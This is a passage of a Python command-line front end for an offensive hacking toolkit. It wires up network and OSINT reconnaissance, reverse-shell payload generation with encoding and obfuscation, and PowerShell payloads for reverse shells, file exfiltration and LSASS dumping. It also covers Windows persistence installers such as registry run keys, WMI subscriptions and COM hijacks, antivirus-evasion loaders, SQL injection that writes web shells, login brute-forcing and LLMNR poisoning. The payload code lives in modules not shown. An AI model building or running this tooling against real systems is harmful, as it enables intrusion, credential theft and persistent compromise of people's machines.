                compact=not args.pretty,
                verbose=args.verbose)
    except Exception as e:
        error(f"delivery failed: {type(e).__name__}: {e}")
        return

    if args.output:
        out = Path(args.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(wrapped, encoding="utf-8")
        success(f"wrote {out} ({len(wrapped)} bytes)")
    else:
        print()
        print(wrapped)
        print()

    success(f"wrapped payload ready ({len(wrapped)} bytes)")


# ---------------------------------------------------------------------
# ps (PowerShell payload library)
# ---------------------------------------------------------------------

def cmd_ps_list(args):
    """List PowerShell payloads."""
    from vuln import ps_payloads
    print()
    success("PowerShell payload library:")
    print()
    for p in ps_payloads.list_payloads():
        params = ""
        if p["params"]:
            params = f"  params: {', '.join(p['params'])}"
        print(f"  {p['name']:16s} [{p['category']:11s}] "
              f"[risk={p['detection_risk']:6s}]  "
              f"{p['description']}{params}")
    print()
    print("Usage: py toolkit.py ps show <name> "
          "[--lhost X --lport Y]")
    print()


def cmd_ps_show(args):
    """Show a payload's one-liner and optionally its script."""
    from vuln import ps_payloads

    name = args.name
    kwargs = {}

    if name == "reverse_shell":
        if not args.lhost or not args.lport:
            error("reverse_shell requires --lhost and --lport")
            return
        kwargs["lhost"] = args.lhost
        kwargs["lport"] = args.lport

    if name == "exfil_file":
        if not args.pattern or not args.exfil_url:
            error("exfil_file requires --pattern and --exfil-url")
            return
        kwargs["pattern"] = args.pattern
        kwargs["exfil_url"] = args.exfil_url

    fn = (ps_payloads.NOARG_PAYLOADS.get(name)
          or ps_payloads.PARAM_PAYLOADS.get(name))
    if fn is None:
        error(f"unknown payload: {name}")
        all_names = (sorted(ps_payloads.NOARG_PAYLOADS) +
                     sorted(ps_payloads.PARAM_PAYLOADS))
        info(f"  available: {', '.join(all_names)}")
        return

    info(f"building payload {name}...")
    try:
        result = fn(**kwargs)
    except Exception as e:
        error(f"payload build failed: {type(e).__name__}: {e}")
        return

    if args.pretty:
        print()
        info("Raw PowerShell script:")
        print()
        print(result["script"])
        print()

    if args.output:
        out = Path(args.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(result["one_liner"], encoding="utf-8")
        success(f"wrote {out} ({len(result['one_liner'])} bytes)")
    else:
        print()
        success(f"One-liner for {name} "
                f"(risk={result['detection_risk']}):")
        print()
        print(result["one_liner"])
        print()


# ---------------------------------------------------------------------
# persist
# ---------------------------------------------------------------------

def cmd_persist_list(args):
    """List persistence mechanisms."""
    from vuln import persistence
    print()
    success("Persistence mechanisms:")
    print()
    for m in persistence.list_mechanisms():
        reqs = f"  requires: {', '.join(m['requirements'])}" \
            if m["requirements"] else ""
        print(f"  {m['name']:20s} "
              f"[risk={m['detection_risk']:6s}] "
              f"[value={m['value']:6s}]  "
              f"{m['description']}{reqs}")
    print()
    print("Usage:")
    print("  py toolkit.py persist install <mech> --payload <name>")
    print("  py toolkit.py persist remove <mech> --name <name>")
    print()


def cmd_persist_install(args):
    """Install a persistence mechanism."""
    from vuln import persistence
    from vuln import ps_payloads

    payload_name = args.payload
    payload = None

    if payload_name == "reverse_shell":
        if not args.lhost or not args.lport:
            error("reverse_shell requires --lhost and --lport")
            return
        payload = ps_payloads.reverse_shell(args.lhost, args.lport)
    elif payload_name == "exfil_file":
        error("exfil_file isn't supported as a persistence payload yet")
        return
    elif payload_name in ps_payloads.NOARG_PAYLOADS:
        payload = ps_payloads.NOARG_PAYLOADS[payload_name]()
    else:
        error(f"unknown payload: {payload_name}")
        info(f"  available: "
             f"{', '.join(sorted(ps_payloads.NOARG_PAYLOADS))}")
        return

    info(f"installing {args.mechanism} with payload "
         f"{payload_name!r}")

    kwargs = {}
    if args.name:
        kwargs["name"] = args.name

    try:
        if args.mechanism == "scheduled_task":
            if args.trigger:
                kwargs["trigger"] = args.trigger
            result = persistence.scheduled_task(payload, **kwargs)
        elif args.mechanism == "registry_run":
            kwargs["scope"] = args.scope
            result = persistence.registry_run(payload, **kwargs)
        elif args.mechanism == "startup_folder":
            result = persistence.startup_folder(payload, **kwargs)
        elif args.mechanism == "service":
            result = persistence.service(payload, **kwargs)
        elif args.mechanism == "wmi_subscription":
            if args.trigger:
                kwargs["trigger"] = args.trigger
            result = persistence.wmi_subscription(payload, **kwargs)
        elif args.mechanism == "com_hijack":
            kwargs["target"] = args.target
            result = persistence.com_hijack(payload, **kwargs)
        else:
            error(f"unknown mechanism: {args.mechanism}")
            return
    except Exception as e:
        error(f"install failed: {type(e).__name__}: {e}")
        return

    if args.output:
        out = Path(args.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(result["one_liner"], encoding="utf-8")
        success(f"wrote {out} ({len(result['one_liner'])} bytes)")
    else:
        print()
        success(f"Persistence one-liner "
                f"(risk={result['detection_risk']}, "
                f"value={result['value']}):")
        print()
        print(result["one_liner"])
        print()


def cmd_persist_remove(args):
    """Remove a persistence mechanism."""
    from vuln import persistence

    info(f"removing {args.mechanism} instance {args.name!r}")
    try:
        if args.mechanism == "scheduled_task":
            result = persistence.remove_scheduled_task(args.name)
        elif args.mechanism == "registry_run":
            result = persistence.remove_registry_run(
                args.name, scope=args.scope)
        elif args.mechanism == "startup_folder":
            result = persistence.remove_startup_folder(args.name)
        elif args.mechanism == "service":
            result = persistence.remove_service(args.name)
        elif args.mechanism == "wmi_subscription":
            result = persistence.remove_wmi_subscription(
                args.name, trigger=args.trigger)
        elif args.mechanism == "com_hijack":
            result = persistence.remove_com_hijack(target=args.target)
        else:
            error(f"unknown mechanism: {args.mechanism}")
            return
    except Exception as e:
        error(f"remove failed: {type(e).__name__}: {e}")
        return

    if args.output:
        out = Path(args.output)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(result["one_liner"], encoding="utf-8")
        success(f"wrote {out}")
    else:
        print()
        print(result["one_liner"])
        print()


# ---------------------------------------------------------------------
# entry point
# ---------------------------------------------------------------------

def main():
    try:
        from core.potato import print_potato_banner
        print_potato_banner(version="0.1")
    except ImportError:
        banner()
        
    # Shared flags that apply to every subcommand
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument(
        "--fingerprint", default=None, metavar="NAME",
        help="HTTP fingerprint profile: a profile name from "
             "core/signatures/browser_profiles.json, or 'random' "
             "(default). Controls User-Agent and the rest of the "
             "header set.",
    )
    common.add_argument(
        "--user-agent", default=None, metavar="UA",
        help="Override User-Agent with a literal string. Ignored if "
             "--fingerprint is also given. Mutually exclusive in spirit.",
    )
    common.add_argument(
        "--list-fingerprints", action="store_true",
        help="List available fingerprint profiles and exit.",
    )

    

    p = argparse.ArgumentParser(
        prog="toolkit",
        description="Offensive toolkit: recon + payload generation + scanning.",
    )
    sub = p.add_subparsers(dest="command", required=True)

    #sub = p.add_subparsers(dest="command", required=True)
    
    # --- network ---
    nw = sub.add_parser("network", help="...", parents=[common])
    nw.add_argument("--target", required=True, help="CIDR, IP, or hostname")
    nw.add_argument("--discover", action="store_true",
                    help="Host discovery sweep")
    nw.add_argument("--ports", action="store_true", help="Port scan")
    nw.add_argument("--services", action="store_true",
                    help="Service fingerprinting")
    nw.add_argument("--topology", action="store_true",
                    help="Traceroute / hop map")
    nw.add_argument("--os", action="store_true", help="OS fingerprint")
    nw.add_argument("--cve", action="store_true",
                    help="Fingerprint + CVE matching")
    nw.add_argument("--audit", action="store_true",
                    help="Full chain: discover → scan → fingerprint → CVE → export")
    nw.add_argument("--top", type=int, default=100,
                    help="Top N ports to scan (default 100)")
    nw.add_argument("--ports-list", default=None,
                    help="Custom port list, e.g. 22,80,443 or 1-1024")
    nw.add_argument("--timeout", type=float, default=1.0,
                    help="Per-probe timeout in seconds (default 1.0)")
    nw.add_argument("--timeout-scale", type=float, default=1.0,
                    help="Multiplier on all timeouts (default 1.0)")
    nw.add_argument("--max-hops", type=int, default=20,
                    help="Max traceroute hops (default 20)")
    nw.add_argument("--no-tcp-fallback", action="store_true",
                    help="Disable TCP SYN fallback for ICMP-blocked hosts")
    nw.add_argument("--no-os-fp", dest="os_fp", action="store_false",
                    default=True,
                    help="Skip OS fingerprinting in --audit mode")
    nw.add_argument("-o", "--output", help="Output path (.json / .csv / .html)")
    nw.add_argument("-v", "--verbose", action="store_true")
    nw.add_argument("--stealth", action="store_true",
                    help="Randomize order + timing; slower but blends in")
    nw.add_argument("--max-pps", type=int, default=None,
                    help="Max packets per second (default: unthrottled)")
    nw.add_argument("--passive", action="store_true",
                    help="Passive sniff mode (no packets sent)")
    nw.add_argument("--passive-seconds", type=int, default=60,
                    help="How long to sniff in passive mode (default 60)")

    nw.add_argument("--snmp", action="store_true",
                    help="Run SNMP walker against the target")
    nw.add_argument("--community", action="append",
                    help="SNMP community string (repeatable)")
    nw.add_argument("--community-file",
                    help="File with one SNMP community per line")

    nw.add_argument("--poison", action="store_true",
                    help="LLMNR/NBT-NS capture (passive by default)")
    nw.add_argument("--poison-active", action="store_true",
                    help="Enable ACTIVE poisoning (requires --authorized-by)")
    nw.add_argument("--authorized-by", default=None,
                    help="Who authorized the active poisoning run")
    nw.add_argument("--poison-duration", type=int, default=60,
                    help="Poison capture window in seconds (default 60)")
    nw.add_argument("--wordlist",
                    help="Wordlist for hash cracking (hashcat/john)")
    nw.add_argument("--smb-port", type=int, default=445,
                    help="SMB listener port for NTLM capture (default 445)")
    nw.add_argument("--http-port", type=int, default=80,
                    help="HTTP listener port for NTLM capture (default 80)")

    nw.add_argument("--multicast", action="store_true",
                    help="mDNS / SSDP / WS-Discovery sweep")
    nw.add_argument("--protocol", action="append",
                    choices=["mdns", "ssdp", "wsd"],
                    help="Limit multicast to specific protocol(s)")
    nw.add_argument("--duration", "-d", type=float, default=5.0,
                    help="Multicast collection window in seconds (default 5.0)")
    nw.add_argument("--no-descriptions", action="store_true",
                    help="Skip fetching XML device descriptions")
    nw.add_argument("--interface", "-i", default=None,
                    help="Override network interface")

    nw.set_defaults(func=cmd_network)

    # --- recon ---
    r = sub.add_parser("recon", help="...", parents=[common])
    r.add_argument("--target", required=True, help="Domain or IP")

    r.add_argument("--subdomains", action="store_true", help="Enumerate subdomains")
    r.add_argument("--subdeep", action="store_true",
                   help="deep subdomain enumeration (passive sources "
                        "+ DNS mining + optional brute force)")
    r.add_argument("--subdeep-brute", action="store_true",
                   help="with --subdeep, enable DNS brute force")
    r.add_argument("--subdeep-full-brute", action="store_true",
                   help="with --subdeep, also use the full "
                        "wordlists/subdomains.txt (~3400 entries)")
    r.add_argument("--subdeep-aliases", default=None,
                   help="comma-separated alias names for the target "
                        "(e.g. 'acme,acm,acme-corp')")
    r.add_argument("--subdeep-rate", type=float, default=5.0,
                   help="DNS queries per second for subdeep brute "
                        "(default 5)")
    r.add_argument("--subdeep-apex", action="store_true",
                   help="with --subdeep, enumerate the full "
                        "registrable domain instead of just the "
                        "input subdomain")
    r.add_argument("--ports", action="store_true", help="Port scan")
    r.add_argument("--http", action="store_true", help="HTTP fingerprint")
    r.add_argument("--urls", action="store_true", help="Crawl target for URLs with parameters")
    r.add_argument("--cms", action="store_true",
                   help="Fingerprint the CMS of a login page or admin URL")
    r.add_argument("--all", action="store_true",
                   help="run the original recon modules "
                        "(subdomains, ports, http)")

    r.add_argument("--tech", action="store_true",
                   help="Fingerprint the technology stack")
    r.add_argument("--leaks", action="store_true",
                   help="Check for exposed sensitive paths")
    r.add_argument("--ct-logs", dest="ct_logs", action="store_true",
                   help="Certificate Transparency log analysis")
    r.add_argument("--whois", action="store_true",
                   help="Domain WHOIS + IP RDAP")
    r.add_argument("--no-reverse", action="store_true",
                   help="Skip reverse-WHOIS (used with --whois)")
    r.add_argument("--asn", action="store_true",
                   help="ASN / BGP / netblock intelligence")
    r.add_argument("--historical", action="store_true",
                   help="Wayback Machine + URLScan + passive DNS")
    r.add_argument("--no-commoncrawl", action="store_true",
                   help="skip Common Crawl query (used with --historical)")
    r.add_argument("--no-grep", action="store_true",
                   help="skip grep.app code search (used with --historical)")
    r.add_argument("--probe-dead", type=int, default=40,
                   help="number of historical URLs to probe for dead "
                        "paths (used with --historical; default 40, "
                        "0 to disable)")
    r.add_argument("--retry-profile",
                   choices=["fast", "moderate", "aggressive"],
                   default="fast",
                   help="retry patience for third-party APIs "
                        "(used with --historical; default fast)")
    r.add_argument("--urlscan-key", default=None,
                   help="URLScan.io API key (enables submitting new scans)")
    r.add_argument("--js", action="store_true",
                   help="Analyze JS files, inline scripts, PWA manifest")
    r.add_argument("--max-js", type=int, default=50,
                   help="Max JS files to analyze (default 50)")
    r.add_argument("--emails", action="store_true",
                   help="Discover email addresses")
    r.add_argument("--hunter-key", default=None,
                   help="Hunter.io API key for corporate email search")
    r.add_argument("--verify-emails", action="store_true",
                   help="SMTP RCPT TO verify found emails (opt-in)")
    r.add_argument("--names-file", default=None,
                   help="file with candidate names for email pattern "
                        "generation, one per line (used with --emails)")
    r.add_argument("--patterns", action="store_true",
                   help="generate candidate emails from learned patterns "
                        "even without a names file (used with --emails)")
    r.add_argument("--min-confidence", type=float, default=0.5,
                   help="minimum pattern confidence for candidate "
                        "generation (default 0.5, used with --emails)")
    r.add_argument("--cloud", action="store_true",
                   help="Enumerate public cloud storage buckets")
    r.add_argument("--cloud-provider", action="append",
                   choices=["s3", "gcs", "digitalocean", "firebase"],
                   help="Restrict cloud_enum to specific provider(s)")
    r.add_argument("--social", action="store_true",
                   help="Discover social media profiles")
    r.add_argument("--github-token", default=None,
                   help="GitHub API token for higher rate limit "
                        "(used with --social; defaults to $GITHUB_TOKEN)")
    r.add_argument("--github-org", default=None,
                   help="explicit GitHub org name for --social "
                        "(skips domain-based auto-detection)")
    r.add_argument("--names-out", default=None,
                   help="write employee names to a file for "
                        "emails.py --names-file (used with --social)")
    r.add_argument("--no-verify", action="store_true",
                   help="Skip profile verification (used with --social)")
    r.add_argument("--investigate", action="store_true",
                   help="Run all 10 recon modules + generate dossier")

    r.add_argument("--parallel", action="store_true",
                   help="Run investigate modules in parallel")
    r.add_argument("--skip", default=None,
                   help="Comma-separated modules to skip (used with "
                        "--investigate)")
    r.add_argument("--only", default=None,
                   help="Comma-separated modules to run exclusively")
    r.add_argument("--json", action="store_true",
                   help="Also write a raw JSON dump from --investigate")
    r.add_argument("--list-investigate-modules", action="store_true",
                   help="List available investigate module keys and exit")

    r.add_argument("--doc-harvest", action="store_true",
                   help="harvest public documents (PDF/DOCX/XLSX/etc) "
                        "and mine them for emails, names, phones, "
                        "metadata")
    r.add_argument("--doc-max", type=int, default=100,
                   help="max documents to download (default 100)")
    r.add_argument("--doc-types", default=None,
                   help="comma-separated extensions to fetch "
                        "(default: pdf,docx,xlsx,pptx,txt,csv)")

    r.add_argument("-v", "--verbose", action="store_true")
    r.add_argument("-o", "--output", help="Save output to file")
    r.add_argument("--top", type=int, default=100,
                   help="Number of top ports to scan")
    r.add_argument("--depth", type=int, default=2,
                   help="Crawl depth (default 2)")
    r.add_argument("--cookie", help="Session cookie string")
    r.add_argument("--rate", type=float, default=5.0,
                   help="Requests per second (default 5)")

    r.set_defaults(func=cmd_recon)

    # --- payload ---
    pl = sub.add_parser("payload", help="...", parents=[common])
    pl_sub = pl.add_subparsers(dest="payload_command")

    pl_gen = pl_sub.add_parser("generate",
                                help="...", parents=[common])
    pl_gen.add_argument("--type",
                        choices=["bash", "python", "powershell",
                                 "php", "perl", "ruby", "nc"],
                        help="Payload language")
    pl_gen.add_argument("--context",
                        choices=list(shells.CONTEXTS.keys()),
                        help="Pick a shell based on situation "
                             "(overrides --type)")
    pl_gen.add_argument("--lhost", required=True, help="Listener IP")
    pl_gen.add_argument("--lport", required=True, type=int,
                        help="Listener port")
    pl_gen.add_argument("--encode",
                        choices=["base64", "hex", "url"],
                        help="Encode the payload")
    pl_gen.add_argument("--obfuscate", metavar="METHOD",
                        help="Obfuscation method "
                             "(use 'list' to see options for your shell type)")
    pl_gen.set_defaults(func=cmd_payload_generate)

    pl_compile = pl_sub.add_parser("compile",
                                    help="...", parents=[common])
    pl_compile.add_argument("--language",
                            choices=["csharp", "c", "cpp"],
                            required=True,
                            help="Source language")
    pl_compile.add_argument("--source",
                            help="Path to source file")
    pl_compile.add_argument("--target", default="",
                            help="Target framework "
                                 "(csharp: net8.0, net48; "
                                 "c: windows-x64)")
    pl_compile.add_argument("--output-type", default=None,
                            help="csharp: Library|Exe; "
                                 "c: dll|exe|windowed|obj")
    pl_compile.add_argument("--name", default="Payload",
                            help="Assembly/output name (default: Payload)")
    pl_compile.add_argument("--post", action="append",
                            help="Post-process step: b64, hex, "
                                 "extract_text, strip (repeatable)")
    pl_compile.add_argument("-o", "--output", help="Write artifact "
                            "to this path (default: cache only)")
    pl_compile.add_argument("--store", action="store_true",
                            help="Also save to workspace loot/payloads/")
    pl_compile.add_argument("-v", "--verbose", action="store_true")
    pl_compile.set_defaults(func=cmd_payload_compile)

    pl_check = pl_sub.add_parser("check",
                                  help="...", parents=[common])
    pl_check.set_defaults(func=cmd_payload_check)

    pl.set_defaults(func=cmd_payload_generate)

    # --- brute ---
    br = sub.add_parser("brute", help="...", parents=[common])
    br.add_argument("--url", required=True, help="Login URL")
    br.add_argument("--email", action="append",
                    help="Email to try (repeatable). If omitted, uses builtin list.")
    br.add_argument("--password", action="append",
                    help="Password to try (repeatable).")
    br.add_argument("--wordlist", help="Path to a password wordlist file")
    br.add_argument("--email-field", default="email",
                    help="POST field name for the email (default 'email')")
    br.add_argument("--password-field", default="password",
                    help="POST field name for the password (default 'password')")
    br.add_argument("--success-marker",
                    help="String that appears on the post-login page")
    br.add_argument("--failure-marker",
                    help="String that appears on the login failure page")
    br.add_argument("--max-attempts", type=int, default=None,
                    help="Stop after this many attempts (default: no limit)")
    br.add_argument("--rate", type=float, default=2.0,
                    help="Requests per second (default 2)")
    br.add_argument("-v", "--verbose", action="store_true")
    br.add_argument("-o", "--output", help="Save findings as JSON")
    br.set_defaults(func=cmd_brute)

    # --- scan ---
    sc = sub.add_parser("scan", help="...", parents=[common])
    sc.add_argument("--url", required=True,
                    help="Target URL (with params, or POST target)")
    sc.add_argument("--method", choices=["GET", "POST"], default="GET",
                    help="HTTP method (default GET)")
    sc.add_argument("--body", help="Request body for POST")
    sc.add_argument("--body-file", help="Read POST body from file (overrides --body)")
    sc.add_argument("--content-type", help="Content-Type for POST body")
    sc.add_argument("--cookie", help="Cookie string")
    sc.add_argument("-H", "--header", action="append",
                    help="Extra header, repeatable (e.g. -H 'X-Foo: bar')")
    sc.add_argument("--rate", type=float, default=15.0,
                    help="Requests per second (default 15)")
    sc.add_argument("--include-headers", action="store_true",
                    help="Also test X-Forwarded-For / Referer / X-Real-IP")
    sc.add_argument("--evade", action="store_true",
                    help="Enable WAF evasion (slower, more likely to work)")
    sc.add_argument("--no-extract", action="store_true",
                    help="Detection only; skip data extraction")
    sc.add_argument("--no-blind", action="store_true",
                    help="Skip the boolean/time oracle pass for blind-only endpoints")
    sc.add_argument("--extract-chars", type=int, default=None,
                    help="Max chars per extracted value (default 100)")
    sc.add_argument("--extract-timeout", type=float, default=None,
                    help="Max seconds per extraction stage (default 900)")
    sc.add_argument("--xss", action="store_true",
                    help="Run reflected-XSS detection instead of SQLi")
    sc.add_argument("--demo-cookie", action="store_true",
                    help="DOM-display demo: alert(document.cookie); no network")
    sc.add_argument("--demo-exfil", action="store_true",
                    help="Localhost-only cookie exfil demo; listener on 127.0.0.1")
    sc.add_argument("--nosql", action="store_true",
                    help="Run NoSQL injection detection instead of SQLi")

    sc.add_argument("--shell", action="store_true",
                    help="After confirming SQLi, attempt to write a web "
                         "shell (INTO OUTFILE / COPY TO). MySQL and "
                         "Postgres only; Session 1 scope.")

    sc.add_argument("--aggressive", action="store_true",
                    help="Allow mutating operations during exploitation "
                         "(e.g. enabling xp_cmdshell on MSSQL). Only "
                         "relevant with --shell. Use only on authorized "
                         "targets.")

    sc.add_argument("--sqlite-shell-path", default=None,
                    help="Absolute path where SQLite should write the "
                         "shell .py file.")

    sc.add_argument("--oob", action="store_true",
                    help="Enable out-of-band extraction (DNS + HTTP listeners)")
    sc.add_argument("--oob-public", default=None,
                    help="Address to embed in OOB payloads (default 127.0.0.1)")
    sc.add_argument("--oob-dns-port", type=int, default=53533,
                    help="DNS listener port (default 53533)")
    sc.add_argument("--oob-http-port", type=int, default=9876,
                    help="HTTP listener port (default 9876)")
    sc.add_argument("--oob-timeout", type=float, default=5.0,
                    help="Seconds to wait for an OOB hit (default 5)")

    sc.add_argument("--login-url", help="Login URL for authenticated scans")
    sc.add_argument("--login-email-field",
                    default='input[name="email"], input[name="login"]',
                    help="CSS selector for the email field")
    sc.add_argument("--login-password-field",
                    default='input[name="password"]',
                    help="CSS selector for the password field")
    sc.add_argument("--login-email", help="Email to log in with")
    sc.add_argument("--login-password", help="Password to log in with")
    sc.add_argument("--login-success-marker",
                    help="String that appears on the post-login page (e.g. 'Dashboard')")

    sc.add_argument("--deliver", default=None,
                    help="After confirming SQLi, deliver this "
                         "ps_payloads payload through RCE "
                         "(e.g. 'whoami_basic', 'local_enum', "
                         "'reverse_shell', 'lsass_dump')")
    sc.add_argument("--deliver-lhost", default=None,
                    help="--lhost for reverse_shell delivery")
    sc.add_argument("--deliver-lport", type=int, default=None,
                    help="--lport for reverse_shell delivery")

    sc.add_argument("-v", "--verbose", action="store_true")
    sc.add_argument("-o", "--output", help="Save findings as JSON")
    sc.set_defaults(func=cmd_scan)

    # --- shell listener ---
    sh = sub.add_parser("shell",
                        help="...", parents=[common])
    sh_sub = sh.add_subparsers(dest="shell_command", required=True)

    sh_listen = sh_sub.add_parser("listen",
                                   help="...", parents=[common])
    sh_listen.add_argument("--host", default="0.0.0.0",
                           help="interface to bind (default 0.0.0.0)")
    sh_listen.add_argument("--port", type=int, default=4444,
                           help="port to listen on (default 4444)")
    sh_listen.add_argument("--tag", default=None,
                           help="skip shell-type auto-detection and "
                                "assume this type "
                                "(bash, sh, cmd, powershell, python)")
    sh_listen.add_argument("-v", "--verbose", action="store_true")
    sh_listen.set_defaults(func=cmd_shell_listen)

    # --- evade ---
    ev = sub.add_parser("evade", help="...", parents=[common])
    ev_sub = ev.add_subparsers(dest="evade_command", required=True)

    ev_list = ev_sub.add_parser("list",
                                 help="...", parents=[common])
    ev_list.set_defaults(func=cmd_evade_list)

    ev_compile = ev_sub.add_parser(
        "compile",
        help="...", parents=[common])
    ev_compile.add_argument("--technique", default=None,
                            help="Technique name (default: all)")
    ev_compile.add_argument("--output", default=None,
                            help="Write to this path (default: cache only)")
    ev_compile.add_argument("--show-loader", action="store_true",
                            help="Print a PowerShell snippet to load "
                                 "and invoke the compiled technique")
    ev_compile.add_argument("--store", action="store_true",
                            help="Also save to workspace loot/payloads/")
    ev_compile.add_argument("-v", "--verbose", action="store_true")
    ev_compile.set_defaults(func=cmd_evade_compile)

    ev_chain = ev_sub.add_parser(
        "chain",
        help="...", parents=[common])
    ev_chain.add_argument("chain", nargs="?", default=None,
                          help="Preset name (stealth, paranoid, silent, "
                               "kitchen_sink, quiet, context_swap, "
                               "silent_amsi, quick) OR comma-separated "
                               "list of techniques")
    ev_chain.add_argument("--list-presets", action="store_true",
                          help="List preset chains and exit")
    ev_chain.add_argument("--output", default=None,
                          help="Write to this path (default: cache only)")
    ev_chain.add_argument("--show-loader", action="store_true",
                          help="Print a PowerShell snippet to load "
                               "and invoke the chain")
    ev_chain.add_argument("--store", action="store_true",
                          help="Also save to workspace loot/payloads/")
    ev_chain.add_argument("-v", "--verbose", action="store_true")
    ev_chain.set_defaults(func=cmd_evade_chain)

    ev_deliver = ev_sub.add_parser(
        "deliver",
        help="...", parents=[common])
    ev_deliver.add_argument("script",
                            help="Path to a PowerShell script, or "
                                 "'-' to read from stdin")
    ev_deliver.add_argument("--bypass", default=None,
                            help="Bypass technique "
                                 "(default: alloc_hglobal)")
    ev_deliver.add_argument("--chain", default=None,
                            help="Use a chain instead of a single "
                                 "technique")
    ev_deliver.add_argument("--pretty", action="store_true",
                            help="Multi-line output instead of one-liner")
    ev_deliver.add_argument("-o", "--output", default=None,
                            help="Write the payload to this file")
    ev_deliver.add_argument("-v", "--verbose", action="store_true")
    ev_deliver.set_defaults(func=cmd_evade_deliver)

    # --- ps (PowerShell payload library) ---
    ps = sub.add_parser("ps",
                        help="...", parents=[common])
    ps_sub = ps.add_subparsers(dest="ps_command", required=True)

    ps_list = ps_sub.add_parser("list",
                                 help="...", parents=[common])
    ps_list.set_defaults(func=cmd_ps_list)

    ps_show = ps_sub.add_parser("show",
                                 help="...", parents=[common])
    ps_show.add_argument("name", help="Payload name")
    ps_show.add_argument("--lhost", default=None)
    ps_show.add_argument("--lport", type=int, default=None)
    ps_show.add_argument("--pattern", default=None)
    ps_show.add_argument("--exfil-url", default=None)
    ps_show.add_argument("--pretty", action="store_true",
                         help="Also print the raw PowerShell")
    ps_show.add_argument("-o", "--output", default=None,
                         help="Write the one-liner to a file")
    ps_show.set_defaults(func=cmd_ps_show)

    # --- persist ---
    pers = sub.add_parser("persist",
                          help="...", parents=[common])
    pers_sub = pers.add_subparsers(dest="persist_command", required=True)

    pers_list = pers_sub.add_parser("list",
                                     help="...", parents=[common])
    pers_list.set_defaults(func=cmd_persist_list)

    pers_install = pers_sub.add_parser("install",
                                        help="...", parents=[common])
    pers_install.add_argument("mechanism",
                              choices=list(PERSISTENCE_NAMES))
    pers_install.add_argument("--payload", required=True,
                              help="PowerShell payload name from "
                                   "the ps library "
                                   "(e.g. 'local_enum', 'reverse_shell')")
    pers_install.add_argument("--name", default=None,
                              help="Instance name (default: random)")
    pers_install.add_argument("--lhost", default=None,
                              help="for reverse_shell payload")
    pers_install.add_argument("--lport", type=int, default=None,
                              help="for reverse_shell payload")
    pers_install.add_argument("--scope", default="user",
                              choices=["user", "machine"],
                              help="for registry_run")
    pers_install.add_argument("--trigger", default=None,
                              help="for scheduled_task (logon/boot/"
                                   "minute/hour) or wmi_subscription "
                                   "(boot/logon/timer)")
    pers_install.add_argument("--target", default="mscfile",
                              choices=list(COM_HIJACK_TARGETS.keys()),
                              help="for com_hijack")
    pers_install.add_argument("-o", "--output", default=None,
                              help="Write the one-liner to a file")
    pers_install.add_argument("-v", "--verbose", action="store_true")
    pers_install.set_defaults(func=cmd_persist_install)

    pers_remove = pers_sub.add_parser("remove",
                                       help="...", parents=[common])
    pers_remove.add_argument("mechanism",
                             choices=list(PERSISTENCE_NAMES))
    pers_remove.add_argument("--name", required=True,
                             help="Instance name")
    pers_remove.add_argument("--scope", default="user",
                             choices=["user", "machine"])
    pers_remove.add_argument("--target", default="mscfile",
                             choices=list(COM_HIJACK_TARGETS.keys()))
    pers_remove.add_argument("--trigger", default="boot",
                             choices=["boot", "logon", "timer"])
    pers_remove.add_argument("-o", "--output", default=None)
    pers_remove.set_defaults(func=cmd_persist_remove)

    args = p.parse_args()
    
    args = p.parse_args()

    # Fingerprint setup. Done once here so every module's new_session()
    # call inherits it via fingerprint.set_default().
    from core import fingerprint
    from core.output import info as _info, warn as _warn, success as _success

    if getattr(args, "list_fingerprints", False):
        _success("Available fingerprint profiles:")
        for name in fingerprint.list_profile_names():
            p = fingerprint.load_profiles()[name]
            print(f"  {name:20s} {p['label']}")
        return

    if getattr(args, "fingerprint", None) and getattr(args, "user_agent", None):
        _warn("both --fingerprint and --user-agent given; "
              "--fingerprint takes precedence, --user-agent ignored")
        chosen = args.fingerprint
    elif getattr(args, "fingerprint", None):
        chosen = args.fingerprint
    elif getattr(args, "user_agent", None):
        chosen = args.user_agent
    else:
        chosen = "random"

    try:
        profile = fingerprint.set_default(chosen)
        if getattr(args, "verbose", False) or getattr(args, "fingerprint", None):
            _info(f"fingerprint: {fingerprint.describe(profile)}")
    except ValueError as e:
        from core.output import error as _error
        _error(f"fingerprint: {e}")
        return

    args._profile = profile

    args._workspace = None
    args._store = None
    try:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if active:
            args._workspace = get_workspace(active)
            args._store = open_store(
                args._workspace.db_path, workspace_name=active)
    except Exception:
        pass

    args.func(args)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted ig..")
        sys.exit(130)